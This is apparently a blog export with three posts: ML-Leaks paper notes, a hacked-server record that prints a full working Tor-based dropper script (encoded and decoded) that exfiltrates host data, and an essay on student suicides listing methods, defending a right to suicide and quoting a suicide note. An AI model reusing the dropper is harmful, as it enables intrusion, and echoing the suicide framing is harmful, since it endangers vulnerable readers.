成员推理：为了推知目标是否在实际训练集中，攻击者向模型查询该数据点并得到后验概率，同样取最大的三个值，然后传给攻击模型来获得成员预测结果。  相比 Shokri 的方法需要使用多个影子模型对每个类别分别进行攻击，本方法只需使用一个影子模型进行攻击，这大大减少了攻击的开销。\n结果如 Fig. 1 所示，本攻击方法的精确率和召回率与 Shokri 等人的几乎一致，在部分数据集上甚至表现更优。\n目标模型结构 接下来展示如何放宽攻击者必须知道目标模型的算法与超参数的情况这一假设。\n首先来看超参数，暂且假设攻击者知道目标模型是一个神经网络但不了解具体细节，先用目标模型的一半参数（即将批尺寸、隐含单元和正则化参数减半）来训练影子模型时，就 Purchase-100 数据集而言，达到了0.86的精确率和0.83的召回率，这和 Fig. 1 中的结果几乎一致；反之，若用两倍参数来训练影子模型时，表现稍显逊色，但仍达到了0.82的精确率和0.80的召回率。在其他数据集上也得到了类似的结果，这证明了成员推理攻击的灵活性：无需知道模型的超参数也能有良好的性能。\n接着再假设攻击者不知道目标模型使用了何种分类算法，首先尝试在影子模型和目标模型的类别不同的情况下直接实施攻击，结果不尽人意。改进的方法是采用组合攻击（combined attack），即将一系列不同的分类器模型组合成一个影子模型，其中每个模型被称为次影子模型（sub-shadow model），具体方法如 Fig. 6 所示\n在 Purchase-100 数据集上的结果证明，和上一部分所展示的攻击方法相比，在目标模型采用多层感知器和逻辑回归时，组合攻击的表现毫不逊色，而当目标模型采用随机森林时，组合攻击的性能就有所下降。\n攻击二：不知数据 本轮攻击放宽了对数据来源的假设，攻击者不再拥有与目标模型的训练数据同分布的数据集，在此情形下，Shokri 等人提议多次查询目标模型以合成数据来训练影子模型，但这种方法只适用于包含二值特征的数据集，而且每合成一个数据点就需要向目标模型发起156次查询，这不仅代价高昂，还可能触发 MLaaS 的警戒机制。与之相比，本方法就能用于攻击在任何数据上训练的机器学习模型，且没有上述任何限制。\n本攻击的策略接近于第一轮攻击，区别在于影子模型所使用的数据集不再与目标模型的训练数据同分布，此种攻击可被称为数据转移攻击（data transferring attack）。在此影子模型并非用于模仿目标模型的行为，而只用于概括机器模型训练集中数据点的成员状态。由于只有最大的三个（对二值数据集来说是两个）后验概率会被用于攻击模型，我们可以忽略数据集的类别数不同带来的影响。\n结果如 Fig. 7 所示，和对角线上第一轮攻击的结果相比，本轮攻击在许多场景下都有接近的表现，如使用 Face 数据集攻击 CIFAR-100 数据集，无论是精确率还是召回率，结果都是0.95，和第一轮攻击相同。在一些场景下，本轮攻击的结果甚至优于第一轮攻击。更有意思的是，在很多场景下，不同来源的数据集能够有效地相互攻击，如 News 数据集 和 CIFAR-100 数据集。\n攻击三：我好像在哪见过你 本轮攻击不再需要训练任何影子模型，也无需知晓目标模型及其数据分布，攻击者拥有的只是向目标模型查询目标数据点 $X_{Target}$ 得到的后验概率 $\\mathcal{M}(X_{Target})$ 。尽管 Yeom 等人提出过类似的攻击，但他们的方法需要知晓目标数据点的分类标签，这有时是难以获得的，而本方法的适用场景就更广泛。\n本攻击模型的实现是一个无监督二元分类器，攻击者先获得 $\\mathcal{M}(X_{Target})$ ，再拿最高的后验概率和一个确定的阀值相比，若高于阀值，则预测此数据点在目标模型的训练集中。选取最高值作为特征是基于如下推理：模型对训练过的数据点表现得更自信，体现在结果上就是，成员数据点的后验概率最大值高于非成员数据点。这是一种朴素的信念，但也符合我们的直觉，人对熟悉的事物表现得更自信，模型亦是如此。\n阀值的选取可根据需求而定，若更关注精确率则用高阀值，更关注召回率则选择低阀值。本文也提供了选择阀值的通用方法。\n综合三轮攻击的结果，可以证明成员推理攻击是非常广泛地适用的。\n防御机制 丢弃 完全连通的神经网络包含大量的参数，容易发生过拟合，而丢弃（dropout）是减少过拟合的一种非常有效的方法。在一个完全连通的神经网络模型中，通过在每次训练迭代中随机删除一个固定的边缘比例（丢失率）来执行该算法。本文对目标模型的输入层和隐藏层都应用了丢弃法，默认的丢弃率设为0.5，因为实验结果表明过高或过低的丢弃率都会降低模型性能\n模型堆叠 丢弃只适用于神经网络模型，而模型堆叠（model stacking）与所选择的分类器无关，这种机制的背后的原理在于，若目标模型的不同部分使用不同的数据子集进行训练，则完整的模型就不易过拟合，这可以通过集成学习（ensemble learning）实现。\n成果总结 为了证明成员推理攻击的广泛性，本文提出了三轮攻击，逐渐放宽了假设。\n第一轮攻击只用到了一个影子模型，大大降低了攻击成本，还通过组合攻击使得攻击者无需了解目标模型的种类。\n第二轮攻击只用放宽了对数据来源的要求，数据转移攻击在实现成员推理攻击效果的同时也更具有普适性。\n第三轮攻击具有最少的假设，攻击者无需构建任何影子模型，攻击是通过无监督的方式进行，在这样的场景下，成员推理仍然卓有成效。\n本文对攻击效果的综合评估充分证明了各种机器学习模型中数据成员的隐私所面临的威胁，为了遏制攻击，本文提出了两种防御机制：丢弃和模型堆叠。由于模型的过拟合程度和对成员推理的敏感性之间存在联系，这些机制也正是为减少过拟合而生。大量评估证明这些防御机制在抵抗成员推理攻击的同时也维持了模型的高可用性。\n参考文献 [1] Salem, Ahmed et al. “ML-Leaks: Model and Data Independent Membership Inference Attacks and Defenses on Machine Learning Models.” Proceedings 2019 Network and Distributed System Security Symposium (2019).\n[2] Shokri, R. et al. “Membership Inference Attacks Against Machine Learning Models.” 2017 IEEE Symposium on Security and Privacy (SP) (2017).\n[3] Pyrgelis, Apostolos et al. “Knock Knock, Who\u0026rsquo;s There? Membership Inference on Aggregate Location Data.” ArXiv abs/1708.06145 (2018).\n[4] Jia, J. and N. Gong. “AttriGuard: A Practical Defense Against Attribute Inference Attacks via Adversarial Machine Learning.” USENIX Security Symposium (2018).\n[5] Yeom, Samuel et al. “Privacy Risk in Machine Learning: Analyzing the Connection to Overfitting.” 2018 IEEE 31st Computer Security Foundations Symposium (CSF) (2018): 268-282.\n","date":"2021-05-22T13:46:52Z","permalink":"https://chinggg.github.io/post/ml-leaks/","tags":["论文笔记","安全","AI"],"title":"ML-Leaks: 针对机器学习模型的成员推理攻击"},{"categories":["记录"],"contents":"└─# lsof -c uBXOvYBM COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME uBXOvYBM 318196 root cwd DIR 254,1 4096 2 / uBXOvYBM 318196 root rtd DIR 254,1 4096 2 / uBXOvYBM 318196 root txt REG 254,1 819252 1048698 /root/08db56cb75fd057be28be1007c5f4424 (deleted) uBXOvYBM 318196 root DEL REG 0,14 127380184 /anon_hugepage uBXOvYBM 318196 root DEL REG 0,14 17030308 /anon_hugepage uBXOvYBM 318196 root DEL REG 0,14 17030306 /anon_hugepage uBXOvYBM 318196 root mem REG 254,1 582 925625 /usr/share/zoneinfo/PRC uBXOvYBM 318196 root 0u a_inode 0,13 0 8043 [eventfd] uBXOvYBM 318196 root 1u a_inode 0,13 0 8043 [eventfd] uBXOvYBM 318196 root 2r CHR 1,3 0t0 4 /dev/null uBXOvYBM 318196 root 3u a_inode 0,13 0 8043 [eventpoll] uBXOvYBM 318196 root 4r FIFO 0,12 0t0 17030300 pipe uBXOvYBM 318196 root 5w FIFO 0,12 0t0 17030300 pipe uBXOvYBM 318196 root 6r FIFO 0,12 0t0 17030299 pipe uBXOvYBM 318196 root 7w FIFO 0,12 0t0 17030299 pipe uBXOvYBM 318196 root 8u a_inode 0,13 0 8043 [eventfd] uBXOvYBM 318196 root 9w REG 254,1 7 262168 /tmp/.X11-unix/11 uBXOvYBM 318196 root 10u IPv4 129901501 0t0 TCP iZwgo7e0o4xyirZ:41142-\u0026gt;static.99.90.243.136.clients.your-server.de:http-alt (ESTABLISHED)  └─# crontab -l 33 * * * * /root/.systemd-service.sh \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp;  #!/bin/bash exec \u0026amp;\u0026gt;/dev/null echo nP8byPUGOwKjVfPZZsp5octdXHTWGyPqgVeY82zV1de6AY0ydAtgEGmo+JaumEfV echo blA4YnlQVUdPd0tqVmZQWlpzcDVvY3RkWEhUV0d5UHFnVmVZODJ6VjFkZTZBWTB5ZEF0Z0VHbW8rSmF1bUVmVgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJ3dnp5djJucHRqdXhjcW9pYmVrbHhlc2U0Nmo0dW9uemFhcHd5bDZ3dmhka25qbHFsY29ldTdpZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgdW5jZW5zb3JlZC5sdXgxLmRucy5uaXhuZXQueHl6IGRucy5ydWJ5ZmlzaC5jbiBkbnMudHduaWMudHcgZG9oLmNlbnRyYWxldS5waS1kbnMuY29tIGRvaC5kbnMuc2IgZG9oLWZpLmJsYWhkbnMuY29tIGZpLmRvaC5kbnMuc25vcHl0YS5vcmcgZG5zLmZsYXR1c2xpZmlyLmlzIGRvaC5saSBkbnMuZGlnaXRhbGUtZ2VzZWxsc2NoYWZ0LmNoKQpwPSQoZWNobyAiZG5zLXF1ZXJ5P25hbWU9cmVsYXkudG9yMnNvY2tzLmluIikKcz0kKCRjIGh0dHBzOi8vJHtuWyQoKFJBTkRPTSUxMCkpXX0vJHAgfCBncmVwIC1vRSAiXGIoWzAtOV17MSwzfVwuKXszfVswLTldezEsM31cYiIgfHRyICcgJyAnXG4nfGdyZXAgLUV2IFsuXTB8c29ydCAtdVJ8aGVhZCAtbiAxKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAuICRIT01FIC91c3IvYmluICRkIC92YXIvdG1wIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaXQgb25pb24uZm91bmRhdGlvbiBvbmlvbi5jb20uZGUgb25pb24uc2ggdG9yMndlYi5zdSAKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCmZleGU7dSAkdC4kaApscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvdG1wO3UgJHQuJGgpCmxzIC9wcm9jLyQoaGVhZCAtbiAxIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXMgfHwgKGNkIC9kZXYvc2htO3UgJHQuJGgpCmVsc2UKYnJlYWsKZmkKZG9uZQo=|base64 -d|bash  #!/bin/bash exec \u0026amp;\u0026gt;/dev/null echo nP8byPUGOwKjVfPZZsp5octdXHTWGyPqgVeY82zV1de6AY0ydAtgEGmo+JaumEfV echo blA4YnlQVUdPd0tqVmZQWlpzcDVvY3RkWEhUV0d5UHFnVmVZODJ6VjFkZTZBWTB5ZEF0Z0VHbW8rSmF1bUVmVgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJ3dnp5djJucHRqdXhjcW9pYmVrbHhlc2U0Nmo0dW9uemFhcHd5bDZ3dmhka25qbHFsY29ldTdpZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgdW5jZW5zb3JlZC5sdXgxLmRucy5uaXhuZXQueHl6IGRucy5ydWJ5ZmlzaC5jbiBkbnMudHduaWMudHcgZG9oLmNlbnRyYWxldS5waS1kbnMuY29tIGRvaC5kbnMuc2IgZG9oLWZpLmJsYWhkbnMuY29tIGZpLmRvaC5kbnMuc25vcHl0YS5vcmcgZG5zLmZsYXR1c2xpZmlyLmlzIGRvaC5saSBkbnMuZGlnaXRhbGUtZ2VzZWxsc2NoYWZ0LmNoKQpwPSQoZWNobyAiZG5zLXF1ZXJ5P25hbWU9cmVsYXkudG9yMnNvY2tzLmluIikKcz0kKCRjIGh0dHBzOi8vJHtuWyQoKFJBTkRPTSUxMCkpXX0vJHAgfCBncmVwIC1vRSAiXGIoWzAtOV17MSwzfVwuKXszfVswLTldezEsM31cYiIgfHRyICcgJyAnXG4nfGdyZXAgLUV2IFsuXTB8c29ydCAtdVJ8aGVhZCAtbiAxKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAuICRIT01FIC91c3IvYmluICRkIC92YXIvdG1wIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaXQgb25pb24uZm91bmRhdGlvbiBvbmlvbi5jb20uZGUgb25pb24uc2ggdG9yMndlYi5zdSAKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCmZleGU7dSAkdC4kaApscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvdG1wO3UgJHQuJGgpCmxzIC9wcm9jLyQoaGVhZCAtbiAxIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXMgfHwgKGNkIC9kZXYvc2htO3UgJHQuJGgpCmVsc2UKYnJlYWsKZmkKZG9uZQo=|base64 -d|bash nP8byPUGOwKjVfPZZsp5octdXHTWGyPqgVeY82zV1de6AY0ydAtgEGmo+JaumEfV exec \u0026amp;\u0026gt;/dev/null export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6) c=$(echo \u0026quot;curl -4fsSLkA- -m200\u0026quot;) t=$(echo \u0026quot;wvzyv2nptjuxcqoibeklxese46j4uonzaapwyl6wvhdknjlqlcoeu7id\u0026quot;) sockz() { n=(doh.defaultroutes.de dns.hostux.net uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch) p=$(echo \u0026quot;dns-query?name=relay.tor2socks.in\u0026quot;) s=$($c https://${n[$((RANDOM%10))]}/$p | grep -oE \u0026quot;\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\u0026quot; |tr ' ' '\\n'|grep -Ev [.]0|sort -uR|head -n 1) } fexe() { for i in . $HOME /usr/bin $d /var/tmp ;do echo exit \u0026gt; $i/i \u0026amp;\u0026amp; chmod +x $i/i \u0026amp;\u0026amp; cd $i \u0026amp;\u0026amp; ./i \u0026amp;\u0026amp; rm -f i \u0026amp;\u0026amp; break;done } u() { sockz f=/int.$(uname -m) x=./$(date|md5sum|cut -f1 -d-) r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep 'inet '|awk {'print $2'}|md5sum|awk {'print $1'})_$(crontab -l|base64 -w0) $c -x socks5h://$s:9050 $t.onion$f -o$x -e$r || $c $1$f -o$x -e$r chmod +x $x;$x;rm -f $x } for h in tor2web.in tor2web.it onion.foundation onion.com.de onion.sh tor2web.su do if ! ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status; then fexe;u $t.$h ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /tmp;u $t.$h) ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /dev/shm;u $t.$h) else break fi done  有时间分析一下此样本\n","date":"2021-02-21T14:29:33Z","permalink":"https://chinggg.github.io/post/server-hacked/","tags":null,"title":"Server-Hacked"},{"categories":["随笔"],"contents":"《自杀论》读书报告——自杀与晚期资本主义社会 说到自杀，人们往往把它当成一种心理现象看待，尝试分析自杀者的精神状态和个人经历，从中寻找其自杀的独特原因。然而，涂尔干在他的著作《自杀论》中指出，自杀其实更是一种社会现象，背后有着深层次的社会原因。在最近年轻人自杀频频发生的背景下，我不能不赞同涂尔干从社会学视角解释自杀现象的合理性，读完《自杀论》后，我尝试运用书中理论理解当今社会自杀频发的原因。\n《自杀论》是一部严谨翔实的社会学著作，在此不对其论证过程做展开，仅简要介绍本书的主要结论为后文的讨论做铺垫。\n涂尔干在对欧洲各国自杀数据进行分析的基础上，把自杀分成三种：利己型自杀、利他型自杀和失范型自杀。\n利己型自杀是新教传播以来个人主义的兴盛而导致的，基于宗教和家庭的传统集体生活渐渐瓦解，个人在得到了相对的自由后却也失去了可依附的对象，脱离了集体活动和社会关系后，生活成了无意义的虚无，既然已看不到生命的价值，自杀便不足为奇了。\n利他型自杀恰恰相反，是由于个人过度融入集体生活，社会对人施以严格控制。为了获得集体的肯定和荣誉，担心被集体所排斥，个人不自觉地在社会给予的压力下朝着集体的目标前进，甚至不惜放弃自己的生命，而他人的自杀又是新一轮狂热的开始。\n失范型自杀是19世纪欧洲典型而普遍的自杀类型，资本主义飞速发展，人们的欲望不断增长，传统的法律道德、价值观念等社会规范遭到挑战，人们毫无准备地被抛置于新的社会秩序中，这种不稳定的社会环境极易滋生暴力，无论是杀人或是自杀。\n当我套用涂尔干关于自杀的理论于当代社会时，竟也能发现一些相通之处。\n现代社会的个人主义倾向已是老生常谈，交通工具的更新和通信技术的发展固然让地球村这一概念深入人心，现实生活中的我们却经常性地处于孤独之中，社会原子化让我们各怀心事又各自为战，功利主义编织的大网没有将我们连接在一起，而是将我们分隔在一个个互相凝视的茧房中。我们自由恋爱成家、自由寻找工作，也能自由地抛弃或被抛弃。“一切皆流，无物常驻”其实本是常态，可资本主义为了让人安分工作又总会提供一种虚假的归属感，“把企业当成家”是再常见不过的口号，然而铁打的营盘流水的兵，当经济状况恶化时，雇佣关系的本质就暴露无疑，下岗失业的残酷现实让幻梦破灭，痛苦更甚。回首向来萧瑟处，也无上帝也无亲，失去了宗教和家庭锁链的我们，真的得到了整个世界吗？或许我们还没做好迎接生命中不可承受之轻的准备？正如马克思所说，人是一切社会关系的总和，一旦脱离社会，个体的生命是那么渺小和短暂，既然自己终究要毁灭，那自杀不过是让这一结局提前到来而已。\n与此同时，个人主义被大力宣扬的背后，却是资本主义文化工业透过大众传媒在操纵着人们的思想，流行文化将批量生产的景观投射给所有社会成员，人们看似能自由选择自己的生活方式，却无时无刻都在被意识形态所塑造。抛去一切由消费构建的外衣，只有赤裸裸的金钱才被承认具有合法性，并成为整个社会所共同追逐的对象和评判个体价值的标尺。马克斯韦伯笔下的新教伦理已然成为事实上的普世价值，凡是与资本主义精神不相容的特征都被认为是一种疾病。陶潜和梭罗式的隐居只能成为幻想，只要参与社会生活，就必须接受社会的度量，哪怕只是想追求个人的小确幸，也不得不被捆绑在资本逐利的大船上，没有任何和解的余地。在这种意义上，每个被冠以奋斗之名在996的流水线上透支生命的打工人都是利他主义自杀在当代社会的牺牲品。\n当今中国处于社会转型期，国内矛盾凸显，国际时局动荡，新冠疫情的突然降临更是让人恍如隔世。信息爆炸、流量为王的时代，世间一切光怪陆离的现象都能立即呈现在我们眼前，挑战着我们的观念。以前我们高喊“知识就是力量”，深信“寒门出贵子”，但后来我们发现，苦尽甘来的不是做题家，而是丁真，小丑竟是我们自己，我们不得不接受“颜值即正义”，自嘲“累就对了，幸福是留给有钱人的”。在价值失范的社会，自杀是无声的控诉。\n如今，自杀率上升已经是一个摆在我们面前的问题，解决方法在哪？涂尔干认为必须从维持社会的有机团结入手，他提出了“职业群体”的制度，试图让职业群体取代家庭和宗教，发挥社会整合与调控的作用。我认为他的出发点是合理的，但他可能没有预见到百年后的世界，社会分工的细致程度大大加强了，社会的团结程度却没有提高，资本主义的确创造出了许多岗位，但职业群体却似乎无法承担整合社会成员的作用，而只是资本运作的副产品，它本身就是不稳定的，只要人无法创造经济价值，就会被无情地驱逐出这个群体，在这里仍然只有赤裸裸的利益关系。在我看来，任何将人不是作为目的，而是作为手段去连接的方式都无法维持社会的团结，因为人与人的关系已被异化，商品拜物教掩盖了真正的社会关系，它对现代社会控制之全面之隐蔽更甚于有史以来的一切宗教，不摆脱它的枷锁，任何从心理学的角度降低自杀率的尝试都是扬汤止沸。\n就在我完成读书报告后不久，拼多多员工猝死事件发生，这虽然不是严格意义上的“自杀”，但无疑正是我所设想的晚期资本主义利他型自杀的典型案例，拼多多官方最初的回应也充分暴露了资本无情的嘴脸：“你们看看底层的人民，哪一个不是用命换钱，我一直不以为是资本的问题，而是这个社会的问题，这是一个用命拼的时代，你可以选择安逸的日子，但你就要选择安逸带来的后果，人是可以控制自己的努力的，我们都可以。”看似客观合理甚至显得积极正能量的回答，却是十足的伪命题。因为即使只是顺应社会现有的规则，也已经是在以加强其合法性的方式参与其中。这个荒诞的世界，是你我共谋的世界。\n自杀永远不会消失，人应当拥有结束自己生命的权利，对部分人来说自杀不过是一种出于理性的选择。但这决不意味着当代社会大批量“生产”自杀的情况是合理的，当人被异化为商品，走投无路之人的自杀也就沦为了过剩商品的自我毁灭，这样的自杀并不是人自由意志的结果，而只是资本逐利的手段，是社会达尔文主义的体现，与其说这是自杀，不如说这是整个社会对个人的蓄意谋杀。与此同时，原本作为个人选择的自杀也被无孔不入的资本主义所寄生，必须将人从异化关系中解放，自杀本身也才能得到解放。\n“做题家”自杀案例分析——以北交大大三跳楼学生为例 背景信息 2020年是大学生自杀事件频发的一年，据网络人士不完全统计如下\n 2020年05月09日 中国传媒大学动画学院研三学生跳楼自杀, 家属认为自杀原因为导师薛燕平阻挠其毕业\n2020年05月23日 南通大学学生跳楼自杀，自杀原因未知\n2020年06月06日 中北大学本科生跳楼自杀, 自杀原因为考试sample作弊被发现\n2020年07月01日 中山大学大四毕业生跳楼自杀，自杀原因未知\n2020年07月30日 于青海可可西里失联的南京航空航天大学大四女生遗骸被发现 (是否属自杀存疑)\n2020年08月18日 南京航空航天大学飞行学院本科生跳楼自杀，自杀原因未知\n2020年08月31日 南京航空航天大学电子信息学院本科生跳楼自杀，自述自杀原因为自身极端理想主义\n2020年09月03日 内蒙古呼和浩特某高校大四女生跳楼自杀，自杀原因未知\n2020年9月初 浙江大学动科院女博士生烧炭自杀，自杀原因为导师压榨\n2020年9月初 上海交通大学自动化系研究生上吊自杀，自杀原因为导师龙承念压榨\n2020年09月10日 浙江理工大学启新学院本科生跳楼自杀，自杀原因疑学业问题\n2020年09月17日 北京交通大学土建学院大二学生跳楼自杀，自杀原因未知\n2020年09月19日 南京大学女博士生跳楼自杀, 自杀原因为导师压榨\n2020年09月19日 中北大学信息商务学院（独立学院）本科新生跳楼自杀, 自杀原因未知\n2020年10月05日 郑州大学本科生跳楼自杀，自杀原因未知\n2020年10月06日 兰州石化职业技术学院大三情侣烧炭自杀, 自杀原因为网贷负债\n2020年10月09日 四川大学华西医学院研二学生跳楼自杀，自杀原因未知\n2020年10月10日 南京审计大学大四学生跳楼自杀，自杀原因未知\n2020年10月上旬 重庆大学学生跳楼自杀，自杀原因未知\n2020年10月12日 江苏大学食品与生物工程学院本科生跳楼自杀, 校方认为自杀原因疑学习困难\n2020年10月12日 华南理工大学医学院学生跳楼自杀，自杀原因未知\n2020年10月13日 大连理工大学化工学院研三学生上吊自杀，自杀原因为毕业压力大，微博名“红烧土豆叶”\n2020年10月14日 广东工业大学华立学院（独立学院）本科生跳楼自杀，自杀原因未知\n2020年10月19日 成都理工大学地质系大一学生于东风渠校内桥梁处失踪，自述找不到生命的意义\n2020年10月22日 北京师范大学博士生跳楼自杀, 自杀原因未知\n2020年10月24日 中南财经政法大学本科生自杀, 自杀原因未知\n2020年10月26日 郑州商学院电气专业大三女生跳楼自杀，自杀原因未知\n2020年10月27日 北京理工大学研三学生跳楼自杀，自杀原因未知\n2020年11月02日 湖南师范大学商学院本科生上吊自杀, 家属认为自杀原因为学工老师肖鹏压榨\n2020年11月05日 合肥工业大学机械学院大二学生跳楼自杀，自杀原因未知\n2020年11月11日 三峡大学本科生跳楼自杀，自杀原因未知\n2020年11月11日 台湾大学陆籍研究生自杀，自杀原因为长期失眠\n2020年11月14日 浙江理工大学政法系学生上吊自杀，自杀原因未知\n2020年11月16日 上海大学数学系大二女生跳楼自杀，自杀原因未知\n2020年11月18日 内蒙古呼和浩特某学院一男学生跳楼自杀，自杀原因未知\n2020年11月18日 上海交通大学密歇根学院学生跳楼自杀，抢救数日后死亡，自杀原因未知\n2020年11月19日 武汉工程大学学生跳楼自杀，自述“自己太笨了、太累了”，B站名“琉科Ryuko”\n2020年11月20日 中山大学公共卫生学院（深圳）毕业年级研究生服药自杀，自杀原因未知\n2020年11月22日 达州职业技术学院大二女生跳楼自杀，自杀原因未知\n2020年11月25日 石家庄铁道大学本科生跳楼自杀，自杀原因未知\n2020年11月25日 四川农业大学学生跳楼自杀，自杀原因未知\n2020年11月28日 中山大学研究生跳楼自杀，自杀原因未知\n2020年11月30日 河南牧业经济学院学生跳楼自杀，自杀原因未知\n2020年12月03日 河南财经政法大学大二女生跳楼自杀，自杀原因未知\n2020年12月03日 湖南第一师范学院外国语学院大四女生上吊自杀，自杀原因未知\n2020年12月04日 南京大学学生烧炭自杀，重度烧伤，现抢救中\n2020年12月05日 西北工业大学本科生跳楼自杀，自杀原因未知\n2020年12月05日 黑龙江科技大学建工学院学生跳楼自杀，自杀原因未知\n2020年12月06日 黑龙江科技大学女生上吊自杀，自杀原因未知\n2020年12月07日 黑龙江科技大学计算机学院学生跳楼自杀，自杀原因未知\n2020年12月08日 广东药科大学卫检专业大二学生于广州大学城新洲村新洲河堤处失踪，12月16日确认离世\n2020年12月13日 安徽师范大学学生跳楼自杀，自杀原因未知\n2020年12月13日 吉林大学莱姆顿学院学生跳楼自杀，自杀原因未知\n2020年12月15日 北京交通大学机电学院大三学生跳楼自杀，自杀原因为“为追求‘全面发展’而舍弃了自身唯一的‘做题’优势，后来\u0026rsquo;意识到问题所在时，为时已晚'”\n2020年12月16日 吉林大学莱姆顿学院学生服药自杀，自杀原因未知\n 从以上数据中，可以看出此类自杀事件具有以下特征：\n 自杀者多为理工科专业学生，男女均有，全国各地各层次高校均有分布 自杀方式多为跳楼，也有上吊、烧炭、失踪 存在同一高校出现连续多人自杀的情况 自杀原因若能明确则多为学业压力和理想破灭，研究生自杀多与导师有关  由于数据统计上的偏差，以上判断仅为个人分析结果，不具备较强的严谨性。但大致可以看出这类自杀现象已不是几个特例，而成为一种典型，可以称之为“做题家”的自杀。由于自杀者的个人信息不便公开，相关资料严重缺乏，下面就其中一位自杀者留下的长篇遗书进行分析，以窥见整个自杀群体的共同心声。\n文字材料—当事人遗书  “再见，各位我所熟识的，或是陌生的人们。 如果你们看到了这段文字，那就说明，我以自己的意志，经过深思熟虑，选择了毁灭自己，这无关任何人，和学校，和辅导员没有任何关系，和我的同学，或是我熟识的人更没有任何关系，希望我的室友或是什么和我关系亲密的人不要借此去闹事。如果你们因此而获得了保研的资格，或是别的什么更大的利益，那对于我们身边那些少说奋斗了三年，多说奋斗了二十年的同学或是同胞不公平。另外，如果你们真的白嫖了三个保研名额的话——为什么不是五个呢？我觉得咱们寝室确实有两个人值得——你们就得给我立个牌位供起来，明白？ 